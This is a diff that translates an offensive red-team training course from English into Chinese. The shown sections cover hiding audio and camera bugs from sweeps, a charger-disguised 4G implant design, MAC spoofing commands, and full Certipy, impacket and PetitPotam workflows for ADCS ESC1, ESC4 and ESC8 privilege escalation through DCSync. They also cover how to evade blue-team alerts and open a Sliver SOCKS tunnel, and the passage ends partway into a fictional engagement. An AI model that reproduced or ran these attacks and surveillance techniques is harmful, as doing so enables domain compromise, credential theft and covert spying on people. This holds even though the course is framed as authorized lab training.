-  Visual inspection (Step 1): can you spot it?
+  目视检查（第 1 步）：你能认出来吗？
   
-  RF sweep (Step 2):
-    Pi Zero W in access point mode: visible as a 2.4 GHz signal
-    Pi Zero W in client mode (connected to WiFi): visible as a WiFi device in a network scan
-    Pi Zero W with 4G USB dongle: sweep 700-2100 MHz for the 4G burst
+  射频扫描（第 2 步）：
+    处于 AP 模式的 Pi Zero W：表现为一个 2.4 GHz 信号
+    处于客户端模式（已连 WiFi）的 Pi Zero W：在网络扫描中表现为 WiFi 设备
+    带 4G USB 网卡的 Pi Zero W：扫描 700-2100 MHz 找 4G 脉冲
   
-  NLJD (Step 3):
-    Pi Zero contains multiple semiconductor junctions (CPU, WiFi chip, audio codec).
-    The NLJD will respond strongly to the Pi Zero even when powered off.
-    Can you locate it from the NLJD response?
+  NLJD（第 3 步）：
+    Pi Zero 含多个半导体结（CPU、WiFi 芯片、音频编解码器）。
+    即使断电，NLJD 也会对 Pi Zero 有强烈响应。
+    你能根据 NLJD 的响应定位它吗？
   
-  Optical (Step 4):
-    No camera in this build: optical step should not trigger.
-    (Add a camera module to make it a full multi-sensor lab)
+  光学（第 4 步）：
+    本方案不含摄像头：光学步骤不应触发。
+    （加一个摄像头模块，就能做成完整的多传感器实验）
   
-  Network scan (Step 5):
-    If connected to WiFi: nmap will find it.
-    Compare MAC address against known-good device list.
-    Pi Zero MAC prefix DC:A6:32 or B8:27:EB: immediate flag.
+  网络扫描（第 5 步）：
+    若已连 WiFi：nmap 会发现它。
+    把 MAC 地址与已知合法设备清单比对。
+    Pi Zero 的 MAC 前缀 DC:A6:32 或 B8:27:EB：立刻标记。
 
-STEP 4: ITERATE
-  Move the concealment. Try different locations. Repeat the detection.
-  Goal: develop the instinct for WHERE bugs are placed most effectively.
-  Every location teaches you something about detection difficulty.
-  The hardest location to detect = the best offensive placement.
+第 4 步：迭代
+  更换藏匿方式。尝试不同位置。重复检测。
+  目标：培养对“窃听器放在哪里最有效”的直觉。
+  每个位置都会让你对检测难度的理解更深一层。
+  最难被发现的位置 = 最好的攻击性布点。
 ```
 
 ---
 
-### 6.5 OFFENSIVE PLANTING PRINCIPLES
+### 6.5 攻击性植入原则
 
 ```
-The four offensive planting principles are derived directly from the four
-detection methods above. Each detection gap directly generates a planting principle.
+这四条攻击性植入原则，直接来自上面的四种检测方法。
+每一个检测缺口都直接生成一条植入原则。
 
-PRINCIPLE 1: NO-EMIT STANDBY
-  Detection gap: RF spectrum sweep only finds devices when they are transmitting.
-  Principle: design the implant to emit nothing during standby.
-  Implementation:
-    VOX activation: device transmits only when sound above a threshold is detected.
-    Scheduled transmission: device transmits only during specific time windows
-    (when the room is typically occupied: detectable by building access logs).
-    GSM callback-only: device is silent until it receives a specific SMS or call
-    to activate: zero RF emission until triggered remotely.
+原则 1：待机零发射
+  检测缺口：射频扫描只能在设备发射时发现它。
+  原则：设计植入体在待机时不发射任何东西。
+  实现：
+    VOX 激活：仅在检测到超过阈值的声音时才发射。
+    定时发射：仅在特定时间窗发射
+    （房间通常有人的时段：可通过楼宇门禁日志判断）。
+    仅 GSM 回拨：设备保持静默，直到收到特定短信或来电
+    才激活：远程触发前零射频发射。
   
-  Result: an RF sweep conducted when the room is empty and the bug is in standby
-  will show nothing. The sweep must be conducted during active use to catch it.
+  结果：在房间空置、窃听器处于待机时进行的射频扫描
+  什么也看不到。必须在活跃使用期间扫描才能抓到它。
 
-PRINCIPLE 2: FORM FACTOR CAMOUFLAGE (NLJD MITIGATION)
-  Detection gap: NLJD finds semiconductors but must triage false positives.
-  Principle: conceal the device in an object that legitimately contains electronics.
-  Implementation:
-    A bug hidden inside a real power strip with real USB charging chips:
-    the NLJD response is attributed to the known electronics.
-    A bug inside a Bluetooth speaker: the response is attributed to the speaker.
-    A bug inside a laptop charger brick: the response is attributed to the charger.
+原则 2：外形伪装（缓解 NLJD）
+  检测缺口：NLJD 能找到半导体，但必须甄别误报。
+  原则：把设备藏在本身合法含有电子器件的物品中。
+  实现：
+    藏在真实插线板里的窃听器，配有真实的 USB 充电芯片：
+    NLJD 的响应会被归因于已知电子器件。
+    藏在蓝牙音箱里的窃听器：响应会被归因于音箱。
+    藏在笔记本电源适配器里的窃听器：响应会被归因于充电器。
   
-  The ideal form factor: an object that belongs in the space, contains its own
-  legitimate electronics (to explain the NLJD response), and draws power from
-  the building (so no battery swap is needed).
+  理想外形：一件本就属于该空间的物品，自带
+  合法电子器件（以解释 NLJD 响应），并从建筑取电
+  （因此无需更换电池）。
 
-PRINCIPLE 3: LENS CONCEALMENT (OPTICAL MITIGATION)
-  Detection gap: optical detection requires a clear line of sight to the lens.
-  Principle: place camera lenses where the lens detection sweep is physically obstructed.
-  Implementation:
-    Pinhole cameras: the lens is 1-3mm in diameter. At 5+ meters, requires extreme
-    precision from the detector sweep to catch the retroreflection.
-    Inside objects with small openings (screw holes, ventilation slots,
-    tie clips, button holes): the lens faces the room through a tiny aperture.
-    False-front concealment: the camera points through a dark-tinted but optically
-    transparent material (dark acrylic). The material reduces retroreflection
-    while allowing the camera to see.
+原则 3：镜头隐蔽（缓解光学检测）
+  检测缺口：光学检测需要到镜头的清晰视线。
+  原则：把摄像头镜头放在镜头探测扫描会被物理遮挡的位置。
+  实现：
+    针孔摄像头：镜头直径 1-3mm。在 5 米以上，探测器扫描
+    需要极高精度才能抓到回反射。
+    藏在带小孔的物品内（螺丝孔、通风槽、
+    领带夹、纽扣孔）：镜头透过极小的孔朝向房间。
+    假面板隐蔽：摄像头透过深色但光学上
+    透明的材料（深色亚克力）取景。该材料减少回反射，
+    同时允许摄像头看见。
 
-PRINCIPLE 4: MAC CAMOUFLAGE (NETWORK DETECTION MITIGATION)
-  Detection gap: network scans flag devices with unknown or hardware-specific MAC addresses.
-  Principle: spoof the MAC address to match an authorized device type.
-  Implementation:
-    On the LAN Turtle or Pi Zero:
+原则 4：MAC 伪装（缓解网络检测）
+  检测缺口：网络扫描会标记 MAC 地址未知或属于特定硬件的设备。
+  原则：伪造 MAC 地址，使其匹配某种已授权设备类型。
+  实现：
+    在 LAN Turtle 或 Pi Zero 上：
 ```
 
 ```bash
-# Spoof MAC address to match a known authorized device type (e.g., Dell laptop):
+# 伪造 MAC 地址以匹配已知的授权设备类型（例如 Dell 笔记本）：
 sudo ip link set eth0 down
-sudo ip link set eth0 address 00:1A:A0:XX:XX:XX  # Dell OUI: 00:1A:A0
+sudo ip link set eth0 address 00:1A:A0:XX:XX:XX  # Dell OUI：00:1A:A0
 sudo ip link set eth0 up
 
-# Or using macchanger:
+# 或用 macchanger：
 sudo apt-get install -y macchanger
 sudo macchanger -m 00:1A:A0:$(openssl rand -hex 3 | sed 's/\(..\)/\1:/g;s/:$//') eth0
 
-# OPSEC: choose an OUI that is common in the target environment.
-# If the target uses all HP machines: use an HP OUI.
-# HP common OUIs: 00:17:A4, 3C:D9:2B
-# Lenovo: 00:21:CC, 28:D2:44
-# Apple: 00:17:F2, 3C:22:FB
-# Match the OUI to what nmap would expect to see in that environment.
+# OPSEC：选一个在目标环境中很常见的 OUI。
+# 若目标全用 HP 机器：用 HP 的 OUI。
+# HP 常见 OUI：00:17:A4、3C:D9:2B
+# Lenovo：00:21:CC、28:D2:44
+# Apple：00:17:F2、3C:22:FB
+# 让 OUI 与 nmap 在该环境中预期看到的设备相匹配。
 ```
 
 ```
-  IDEAL IMPLANT CONCEPT (2027 best-in-class):
+  理想植入体概念（2027 年一流水平）：
   
-    Form factor: USB-C wall charger (provides legitimate power, has its own electronics)
+    外形：USB-C 墙插充电器（提供合法供电，自带电子器件）
     
-    Hardware:
-      Real USB-C PD charging IC (makes it functional: passes the "plug in phone" test)
-      Raspberry Pi Compute Module 4 (small, low power, powerful)
-      4G LTE USB modem with SIM (no local network dependency)
-      USB audio dongle (for audio collection)
-      Pinhole camera module (optional)
+    硬件：
+      真实的 USB-C PD 充电 IC（让它真能用：通过“插手机充电”测试）
+      Raspberry Pi Compute Module 4（体积小、功耗低、性能强）
+      带 SIM 卡的 4G LTE USB 模块（不依赖本地网络）
+      USB 音频转接头（用于音频采集）
+      针孔摄像模块（可选）
     
-    Behavior:
-      Charges phones normally (passes physical inspection and use-testing)
-      Transmits only during business hours (VOX + scheduled window)
-      Uses CDN domain-fronted HTTPS beacon (not AutoSSH: see Section 1.8)
-      MAC address spoofed to match common charger/embedded device OUI
-      4G modem: completely independent of target network (no network scan can catch it)
+    行为：
+      正常给手机充电（能通过物理检查和实际使用测试）
+      仅在营业时段发射（VOX + 定时窗口）
+      使用 CDN 域名前置的 HTTPS 信标（不用 AutoSSH：见 1.8 节）
+      MAC 地址伪造成常见充电器/嵌入式设备的 OUI
+      4G 模块：完全独立于目标网络（任何网络扫描都抓不到）
     
-    Detection resistance:
-      Visual: looks and functions like a charger
-      RF: only transmits during scheduled windows when the room is occupied
-          (sweep during empty room: nothing found)
-      NLJD: response attributed to the legitimate charging IC
-      Optical: no camera, or pinhole camera with dark acrylic cover
-      Network: on 4G modem: invisible to local network entirely
+    抗检测能力：
+      目视：外观与功能都像充电器
+      射频：仅在房间有人的定时窗口内发射
+          （空房间扫描：什么也发现不了）
+      NLJD：响应被归因于合法的充电 IC
+      光学：无摄像头，或带深色亚克力遮罩的针孔摄像头
+      网络：走 4G 模块：对本地网络完全不可见
     
-    This is the standard that separates professional-grade surveillance hardware
-    from the average hardware implant described in most security courses.
+    这个标准，正是专业级监控硬件与多数安全课程里
+    所述普通硬件植入体的分界线。
 ```
 
 ---
 
-## SECTION 7: ADCS ATTACK PATHS
+## 第 7 部分：ADCS 攻击路径
 
-> Active Directory Certificate Services (ADCS) is the most exploited privilege escalation vector in enterprise Active Directory as of 2027. BloodHound discovers it. Certipy exploits it. Most organizations have it. Most blue teams cannot detect it. Every top-0.0001% operator must know it completely.
+> 截至 2027 年，Active Directory 证书服务（ADCS）是企业 Active Directory 中被利用最多的提权路径。BloodHound 能发现它。Certipy 能利用它。多数组织都有它。多数蓝队检测不到它。每一位前 0.0001% 的操作员都必须彻底掌握它。
 
 ---
 
-### 7.1 WHAT ADCS IS AND WHY IT MATTERS
+### 7.1 ADCS 是什么以及为何重要
 
 ```
-WHAT ADCS IS:
-  Active Directory Certificate Services is Microsoft's Public Key Infrastructure (PKI)
-  implementation. It issues digital certificates to users, computers, and services
-  within a domain for authentication, encryption, and code signing.
+ADCS 是什么：
+  Active Directory 证书服务是微软的公钥基础设施（PKI）
+  实现。它向域内的用户、计算机和服务签发数字证书，
+  用于认证、加密和代码签名。
   
-  Components:
-    Certificate Authority (CA): the server that issues certificates
-      Enterprise CA: integrated with AD, certificates use AD objects
-      Standalone CA: not AD-integrated
-    Certificate Templates: define what certificates can be issued, to whom, and with what properties
-    Enrollment: how principals request and receive certificates
+  组件：
+    证书颁发机构（CA）：签发证书的服务器
+      企业 CA：与 AD 集成，证书使用 AD 对象
+      独立 CA：不与 AD 集成
+    证书模板：定义可签发什么证书、给谁、具备哪些属性
+    注册：主体如何申请并获得证书
 
-WHY IT IS THE DOMINANT 2027 ESCALATION VECTOR:
-  1. Certificates issued by ADCS can authenticate to AD without a password.
-     A certificate for UserA lets you log in as UserA forever (until it expires).
-     Unlike passwords, certificates do not change when a user resets their password.
+为什么它是 2027 年的主导提权路径：
+  1. ADCS 签发的证书可以在没有密码的情况下通过 AD 认证。
+     一张 UserA 的证书能让你永远以 UserA 身份登录（直到它过期）。
+     与密码不同，用户改密码时证书不会改变。
   
-  2. ADCS has been deployed and never reviewed in most organizations.
-     Default certificate templates from Windows 2000 are still active in 2027 environments.
-     Misconfigured templates = trivial privilege escalation.
+  2. 多数组织部署了 ADCS 却从未审查过。
+     Windows 2000 时代的默认证书模板在 2027 年的环境里仍然启用。
+     配置错误的模板 = 轻而易举的提权。
   
-  3. Most EDR and SIEM products do not alert on certificate enrollment requests.
-     Kerberoasting triggers alerts. ADCS exploitation often does not.
+  3. 多数 EDR 与 SIEM 产品不会对证书注册请求告警。
+     Kerberoasting 会触发告警。ADCS 利用通常不会。
   
-  4. The attack was publicly documented in 2021 (Certified Pre-Owned: SpecterOps).
-     Four years later, most organizations have not audited their PKI.
+  4. 该攻击在 2021 年被公开记录（Certified Pre-Owned：SpecterOps）。
+     四年后，多数组织仍未审计自己的 PKI。
 
-ADCS ATTACK TAXONOMY (ESC1-ESC13: we cover the three most critical):
-  ESC1: misconfigured certificate template (enrollee supplies SAN)
-  ESC4: write permission on a certificate template
-  ESC8: NTLM relay to ADCS HTTP enrollment endpoint
+ADCS 攻击分类（ESC1-ESC13：我们讲最关键的三类）：
+  ESC1：配置错误的证书模板（申请人可自填 SAN）
+  ESC4：对证书模板拥有写权限
+  ESC8：NTLM 中继到 ADCS HTTP 注册端点
 ```
 
 <div align="center">
@@ -3973,84 +3973,84 @@ ADCS ATTACK TAXONOMY (ESC1-ESC13: we cover the three most critical):
 
 ---
 
-### 7.2 ESC1: MISCONFIGURED CERTIFICATE TEMPLATE
+### 7.2 ESC1：配置错误的证书模板
 
 ```
-WHAT MAKES A TEMPLATE VULNERABLE TO ESC1:
-  All four conditions must be true simultaneously:
+模板为何会受 ESC1 影响：
+  四个条件必须同时成立：
 
-  Condition 1: Template grants enrollment to a low-privilege group
-    Examples: "Domain Users", "Authenticated Users", "Domain Computers"
-    This means any domain user can request a certificate from this template.
+  条件 1：模板向低权限组授予注册权限
+    例如：“Domain Users”“Authenticated Users”“Domain Computers”
+    这意味着任何域用户都能从此模板申请证书。
 
-  Condition 2: Manager approval NOT required
-    If no manager approval is required: certificate is issued automatically.
-    If approval required: attack requires social engineering or a long wait.
+  条件 2：不要求管理员审批
+    若不要求管理员审批：证书自动签发。
+    若要求审批：攻击需要社会工程或长时间等待。
 
-  Condition 3: Client-supplied Subject Alternative Name (SAN) allowed
-    The flag: "Supply in the request" in the Subject Name tab of the template.
-    This allows the requester to specify ANY subject (including Domain Admin).
+  条件 3：允许客户端自填主体备用名称（SAN）
+    标志：模板 Subject Name 选项卡中的“Supply in the request”。
+    这允许申请人指定任意主体（包括 Domain Admin）。
 
-  Condition 4: The certificate can be used for authentication
-    Extended Key Usage (EKU) includes:
-    Client Authentication (1.3.6.1.5.5.7.3.2)
-    PKINIT Client Authentication (1.3.6.1.5.2.3.4)
-    Smart Card Logon (1.3.6.1.4.1.311.20.2.2)
-    Any Purpose (2.5.29.37.0)
+  条件 4：证书可用于认证
+    扩展密钥用法（EKU）包含：
+    Client Authentication（1.3.6.1.5.5.7.3.2）
+    PKINIT Client Authentication（1.3.6.1.5.2.3.4）
+    Smart Card Logon（1.3.6.1.4.1.311.20.2.2）
+    Any Purpose（2.5.29.37.0）
     
-    If ANY of these are in the EKU: the certificate can authenticate to AD.
+    若 EKU 中含有以上任意一项：该证书就能通过 AD 认证。
 
-  ESC1 = Conditions 1 + 2 + 3 + 4 all true.
-  The result: ANY domain user can request a certificate that says
-  "I am Administrator" and use it to log in as Administrator.
+  ESC1 = 条件 1 + 2 + 3 + 4 同时成立。
+  结果：任何域用户都能申请一张写着
+  “我是 Administrator”的证书，并用它以 Administrator 身份登录。
 ```
 
 ---
 
-### 7.3 CERTIPY FULL WORKFLOW (ESC1 + ESC4 + ESC8)
+### 7.3 Certipy 完整工作流（ESC1 + ESC4 + ESC8）
 
 ```bash
 # ===================================================================
-# CERTIPY INSTALLATION
+# CERTIPY 安装
 # ===================================================================
 
-# Install Certipy (Python 3.8+):
+# 安装 Certipy（Python 3.8+）：
 pip3 install certipy-ad --break-system-packages
 
-# Verify:
+# 验证：
 certipy --help
 
 # ===================================================================
-# STEP 1: ENUMERATE ADCS INFRASTRUCTURE
+# 步骤 1：枚举 ADCS 基础设施
 # ===================================================================
 
-# Discover Certificate Authorities and vulnerable templates:
+# 发现证书颁发机构与存在漏洞的模板：
 certipy find \
     -u jsmith@corp.local \
     -p 'Password123!' \
     -dc-ip 10.0.0.1 \
     -stdout
 
-# Output: JSON and text report of all CAs, templates, and vulnerabilities.
-# Key section to look for: "Vulnerabilities" under each template.
-# ESC1 vulnerable templates are clearly labeled.
+# 输出：所有 CA、模板与漏洞的 JSON 和文本报告。
+# 重点查看：每个模板下的 "Vulnerabilities" 部分。
+# ESC1 存在漏洞的模板会被明确标注。
 
-# Save output for report evidence:
+# 保存输出作为报告证据：
 certipy find \
     -u jsmith@corp.local \
     -p 'Password123!' \
     -dc-ip 10.0.0.1 \
     -output /tmp/certipy_enum
 
-# This creates: /tmp/certipy_enum.json and /tmp/certipy_enum.txt
-# The JSON can be imported into BloodHound for visualization.
+# 这会生成：/tmp/certipy_enum.json 和 /tmp/certipy_enum.txt
+# JSON 可导入 BloodHound 做可视化。
 
 # ===================================================================
-# STEP 2: ESC1 EXPLOITATION
-# (Vulnerable template: any user can enroll + supplies SAN + auth EKU)
+# 步骤 2：ESC1 利用
+# （存在漏洞的模板：任何用户都可注册 + 可自填 SAN + 有认证 EKU）
 # ===================================================================
 
-# Request a certificate as Administrator using an ESC1-vulnerable template:
+# 用存在 ESC1 漏洞的模板以 Administrator 身份申请证书：
 certipy req \
     -u jsmith@corp.local \
     -p 'Password123!' \
@@ -4059,20 +4059,20 @@ certipy req \
     -dc-ip 10.0.0.1 \
     -upn 'Administrator@corp.local'
 
-# The -upn flag sets the Subject Alternative Name User Principal Name to Administrator.
-# The CA issues the certificate because the template allows client-supplied SAN.
-# Output: administrator.pfx (the certificate file)
+# -upn 参数把主体备用名称中的用户主体名称设为 Administrator。
+# 因为模板允许客户端自填 SAN，CA 会签发该证书。
+# 输出：administrator.pfx（证书文件）
 
 # ===================================================================
-# STEP 3: AUTHENTICATE WITH THE CERTIFICATE (PKINIT)
+# 步骤 3：用证书认证（PKINIT）
 # ===================================================================
 
-# Use the certificate to get a TGT (Ticket-Granting Ticket) as Administrator:
+# 用该证书以 Administrator 身份获取 TGT（票据授予票据）：
 certipy auth \
     -pfx administrator.pfx \
     -dc-ip 10.0.0.1
 
-# Output:
+# 输出：
 # [*] Using principal: administrator@corp.local
 # [*] Trying to get TGT...
 # [*] Got TGT
@@ -4080,161 +4080,161 @@ certipy auth \
 # [*] Trying to retrieve NT hash for 'administrator'
 # [*] Got hash for 'administrator@corp.local': [NTLM_HASH]
 
-# The NTLM hash can be used for:
-# 1. Pass-the-Hash to any system in the domain
-# 2. Direct authentication via impacket tools
-# 3. secretsdump to obtain all domain hashes
+# 该 NTLM 哈希可用于：
+# 1. 对域内任何系统做哈希传递
+# 2. 通过 impacket 工具直接认证
+# 3. 用 secretsdump 获取所有域哈希
 
 # ===================================================================
-# STEP 4: PASS-THE-HASH WITH THE OBTAINED ADMINISTRATOR NTLM HASH
+# 步骤 4：用取得的 Administrator NTLM 哈希做哈希传递
 # ===================================================================
 
-# Get all domain hashes (you are now Domain Admin via ADCS):
+# 获取所有域哈希（你现在已通过 ADCS 成为域管理员）：
 impacket-secretsdump \
     -hashes 'aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]' \
     'corp.local/Administrator@10.0.0.1'
 
 # ===================================================================
-# STEP 5: ESC4 EXPLOITATION
-# (You have Write permission on a template: modify it to be ESC1-vulnerable)
+# 步骤 5：ESC4 利用
+# （你对某个模板有写权限：把它改成存在 ESC1 漏洞）
 # ===================================================================
 
-# Check your permissions on templates:
+# 检查你对模板的权限：
 certipy find -u jsmith@corp.local -p 'Password123!' -dc-ip 10.0.0.1 -stdout | \
     grep -A5 "Write\|GenericWrite\|FullControl"
 
-# If you have write access to a template:
-# Modify the template to enable client-supplied SAN (sets it to ESC1 state):
+# 若你对某个模板有写权限：
+# 修改该模板以启用客户端自填 SAN（使其进入 ESC1 状态）：
 certipy template \
     -u jsmith@corp.local \
     -p 'Password123!' \
     -dc-ip 10.0.0.1 \
     -template 'ModifiableTemplate' \
-    -save-old    # IMPORTANT: saves the original config for restoration
+    -save-old    # 重要：保存原始配置以便还原
 
-# The template is now ESC1-vulnerable. Proceed with Step 2 above.
-# After obtaining the DA certificate: RESTORE THE TEMPLATE:
+# 模板现在存在 ESC1 漏洞。继续执行上面的步骤 2。
+# 拿到 DA 证书之后：还原模板：
 certipy template \
     -u jsmith@corp.local \
     -p 'Password123!' \
     -dc-ip 10.0.0.1 \
     -template 'ModifiableTemplate' \
-    -configuration ModifiableTemplate.json  # The saved-old config
+    -configuration ModifiableTemplate.json  # 保存的原始配置
 
 # ===================================================================
-# STEP 6: ESC8 EXPLOITATION
-# (NTLM relay to the CA HTTP enrollment endpoint)
+# 步骤 6：ESC8 利用
+# （NTLM 中继到 CA 的 HTTP 注册端点）
 # ===================================================================
 
-# ESC8 targets the CA's HTTP enrollment endpoint: /certsrv/
-# It accepts NTLM authentication. When relayed: you can request ANY certificate.
-# Target: coerce a machine account (DC$) to authenticate to your relay.
+# ESC8 针对 CA 的 HTTP 注册端点：/certsrv/
+# 它接受 NTLM 认证。经中继后：你可以申请任意证书。
+# 目标：强制一台机器账户（DC$）向你的中继器认证。
 
-# Step 6a: Start ntlmrelayx targeting the CA HTTP endpoint:
+# 步骤 6a：启动针对 CA HTTP 端点的 ntlmrelayx：
 impacket-ntlmrelayx \
     -t 'http://CA-SERVER/certsrv/certfnsh.asp' \
     -smb2support \
     --adcs \
     --template 'DomainController'
 
-# Step 6b: In a second terminal: coerce the DC to authenticate to your machine.
-# Options for coercion:
-# PetitPotam (if unpatched, CVE-2021-36942):
+# 步骤 6b：在第二个终端：强制 DC 向你的机器认证。
+# 强制认证的可选手段：
+# PetitPotam（若未打补丁，CVE-2021-36942）：
 python3 PetitPotam.py -u jsmith -p 'Password123!' YOUR_IP DC_IP
 
-# Coerce (PetitPotam alternative, broader coercion techniques):
+# 强制认证（PetitPotam 的替代，更广泛的强制认证技术）：
 python3 Coerce.py -u jsmith -p 'Password123!' -d corp.local YOUR_IP DC_IP
 
-# Step 6c: ntlmrelayx captures the NTLM auth from the DC and relays it to /certsrv/.
-# The CA issues a certificate for DC$ (the domain controller machine account).
-# Output: base64-encoded certificate printed to console.
+# 步骤 6c：ntlmrelayx 捕获来自 DC 的 NTLM 认证并中继到 /certsrv/。
+# CA 会为 DC$（域控机器账户）签发一张证书。
+# 输出：以 base64 编码打印到控制台的证书。
 
-# Step 6d: Decode the certificate:
+# 步骤 6d：解码证书：
 echo "[BASE64_CERT]" | base64 -d > dc.pfx
 
-# Step 6e: Use the DC machine account certificate to perform a DCSync attack:
-# First: authenticate with the certificate to get the DC machine account TGT:
+# 步骤 6e：用 DC 机器账户证书执行 DCSync 攻击：
+# 首先：用该证书认证，获取 DC 机器账户的 TGT：
 certipy auth \
     -pfx dc.pfx \
     -dc-ip 10.0.0.1 \
     -username 'DC$' \
     -domain 'corp.local'
 
-# Use the obtained NTLM hash for the DC machine account to DCSync:
+# 用取得的 DC 机器账户 NTLM 哈希做 DCSync：
 impacket-secretsdump \
     -hashes 'aad3b435b51404eeaad3b435b51404ee:[DC_NTLM_HASH]' \
     'corp.local/DC$@10.0.0.1'
 
-# You now have all domain hashes including krbtgt.
-# Domain is fully compromised.
+# 你现在拥有所有域哈希，包括 krbtgt。
+# 域已完全攻陷。
 
 # ===================================================================
-# ADCS CLEANUP (after engagement)
+# ADCS 清理（行动之后）
 # ===================================================================
 
-# If you modified a template (ESC4): restore it immediately after obtaining DA.
-# Use the saved-old configuration from certipy template --save-old.
+# 若你修改过模板（ESC4）：拿到 DA 后立即还原。
+# 使用 certipy template --save-old 保存的原始配置。
 
-# Certificate revocation: request your CA admin (the client) revoke the certificates
-# you issued during the engagement. Include certificate serial numbers in the report.
-# Serial numbers are in the certipy output during the req step.
+# 证书吊销：请你的 CA 管理员（客户）吊销你在行动期间
+# 签发的证书。在报告中附上证书序列号。
+# 序列号出现在 req 步骤的 certipy 输出中。
 
-# The client's CA admin must also:
-# 1. Audit the certificate template that was exploited: disable client-supplied SAN
-# 2. Add manager approval requirement
-# 3. Review all certificates issued from the vulnerable template in the last 90 days
-#    and revoke any that are unexpected
+# 客户的 CA 管理员还必须：
+# 1. 审计被利用的证书模板：禁用客户端自填 SAN
+# 2. 加上管理员审批要求
+# 3. 复查过去 90 天内从该漏洞模板签发的所有证书，
+#    并吊销任何意料之外的证书
 ```
 
 ---
 
-### 7.4 ADCS DETECTION EVASION
+### 7.4 ADCS 检测规避
 
 ```
-WHAT BLUE TEAMS LOOK FOR (and how to avoid triggering it):
+蓝队在找什么（以及如何避免触发）：
 
-  Alert 1: Certificate enrollment from an unusual account
-    Detection: SIEM rule on Event ID 4886 (certificate request received)
-               from accounts that do not normally request certificates.
-    Evasion: use the low-privilege account you compromised for enrollment.
-             A domain user requesting a certificate is normal.
-             Administrator requesting one via certipy is unusual: use jsmith's account.
+  告警 1：来自异常账户的证书注册
+    检测：针对事件 ID 4886（收到证书请求）的 SIEM 规则，
+              关注通常不申请证书的账户。
+    规避：用你已攻陷的低权限账户来做注册。
+             一个域用户申请证书是正常的。
+             Administrator 通过 certipy 申请则不寻常：用 jsmith 的账户。
 
-  Alert 2: New certificate from a sensitive template
-    Detection: monitoring on specific high-value template names.
-    Evasion: the vulnerable template is typically a legitimate-looking template name
-    ("UserAuthentication", "WebServer", "CodeSigning").
-    Research the template names in your certipy find output before choosing.
+  告警 2：来自敏感模板的新证书
+    检测：对特定的高价值模板名做监控。
+    规避：存在漏洞的模板通常有个看起来合规的名字
+    （“UserAuthentication”“WebServer”“CodeSigning”）。
+    选择之前，先在 certipy find 的输出里研究模板名。
 
-  Alert 3: NTLM relay detection (for ESC8)
-    Detection: NetLogon events, SMB signing violations, unusual NTLM to HTTP relay.
-    Evasion: ESC8 is hard to do quietly. For covert engagements: prefer ESC1 or ESC4
-    over ESC8. ESC8 is noisier due to the coercion step.
+  告警 3：NTLM 中继检测（针对 ESC8）
+    检测：NetLogon 事件、SMB 签名违规、异常的 NTLM 到 HTTP 中继。
+    规避：ESC8 很难做得安静。对隐蔽型行动：优先用 ESC1 或 ESC4
+    而非 ESC8。由于有强制认证步骤，ESC8 更吵。
 
-  Alert 4: certipy tool signature in process execution
-    Detection: EDR catches certipy.exe or Python process with certipy args.
-    Evasion: run certipy on your operator machine (not inside the target network).
-    certipy communicates with the CA over the network: you do not need to run it
-    on a domain-joined machine. Run it from your external Sliver session's SOCKS tunnel:
+  告警 4：进程执行中的 certipy 工具特征
+    检测：EDR 抓 certipy.exe 或带 certipy 参数的 Python 进程。
+    规避：在你的操作员机器上运行 certipy（不在目标网络内）。
+    certipy 通过网络与 CA 通信：你不需要在加入域的机器上
+    运行它。从你外部 Sliver 会话的 SOCKS 隧道运行：
     
-    On Sliver C2:
+    在 Sliver C2 上：
     sliver (session) > socks5 start --host 127.0.0.1 --port 1080
     
-    On your operator machine:
+    在你的操作员机器上：
     proxychains4 certipy find -u jsmith@corp.local -p 'Password123!' -dc-ip 10.0.0.1
 
-WHAT TO ADD TO EVERY REPORT THAT INVOLVES ADCS:
-  For each ADCS finding: include the certificate serial number(s) used.
-  Include: the template name, the CA name, the account used to enroll, the UPN spoofed.
-  Remediation: the CA admin must disable SAN-enrollment on the template + revoke certificates.
-  Detection guidance: point to Event ID 4886, 4887, 4888 in the Security log on the CA server.
+每份涉及 ADCS 的报告都要加入：
+  对每项 ADCS 发现：附上所用证书的序列号。
+  包含：模板名、CA 名、用于注册的账户、伪造的 UPN。
+  修复：CA 管理员必须在该模板上禁用 SAN 注册 + 吊销证书。
+  检测指引：指向 CA 服务器 Security 日志中的事件 ID 4886、4887、4888。
 ```
 
 ---
 
-## SECTION 8: OPERATION SILENT LEDGER V2
+## 第 8 部分：寂静账本行动 v2
 
-> Full operational scenario. Every section of Phase 6 chains together into one operation. Read it as a real engagement. Execute each step in your lab. Silent Ledger v2 adds what v1 lacked: ADCS escalation, EDR-evasive implant callbacks, and cloud lateral movement into Azure AD. This is the complete 2027 kill chain.
+> 完整作战场景。第 6 阶段的每一节都串成一次行动。把它当成一次真实的行动来读。在实验室里执行每一步。寂静账本 v2 补上了 v1 缺的：ADCS 提权、规避 EDR 的植入体回连，以及进入 Azure AD 的云上横向移动。这是 2027 年的完整杀伤链。
 
 <div align="center">
 <table><tr><td>
@@ -4246,166 +4246,166 @@ WHAT TO ADD TO EVERY REPORT THAT INVOLVES ADCS:
 
 ---
 
-### ENGAGEMENT PARAMETERS
+### 行动参数
 
 ```
-CLIENT:          Meridian Capital Group (fictional)
-SECTOR:          Financial services (investment management)
-ENVIRONMENT:     Hybrid: on-premises AD (Windows Server 2022) + Azure AD (Entra ID)
-                 ~1,400 employees across two physical locations
-ENGAGEMENT TYPE: Full-scope blind red team (blue team NOT notified)
-AUTHORIZED SCOPE:
-  Physical:      Both office locations, full physical techniques
-  SE:            All employee groups including C-suite
-  Technical:     Full AD, Azure AD, internal network, cloud workloads
-  Exclusions:    Client-facing trading platform (production: hands-off)
-OBJECTIVE:       Reach crown jewels: proprietary trading algorithm source code
-                 (stored in Azure DevOps repository) and SQL database
-                 containing client portfolio data
-C2 INFRASTRUCTURE:
-  Primary:       Sliver HTTPS over Cloudflare CDN fronting
-  C2 Domain:     cdn-assets-delivery[.]com (behind Cloudflare)
-  Backup:        DNS-over-HTTPS beacon (Cloudflare DoH)
-ABORT PHRASE:    "Falcon One"
+客户：          Meridian Capital Group（虚构）
+行业：          金融服务（投资管理）
+环境：          混合：本地 AD（Windows Server 2022）+ Azure AD（Entra ID）
+                 约 1,400 名员工，分布两个实体地点
+行动类型：      全范围盲测红队（蓝队未获通知）
+授权范围：
+  物理：        两个办公地点，全部物理技术
+  社会工程：    所有员工群体，包括高管层
+  技术：        完整 AD、Azure AD、内部网络、云负载
+  排除项：      面向客户的交易平台（生产环境：完全不碰）
+目标：          触达核心资产：专有交易算法源代码
+                 （存于 Azure DevOps 仓库）以及包含
+                 客户投资组合数据的 SQL 数据库
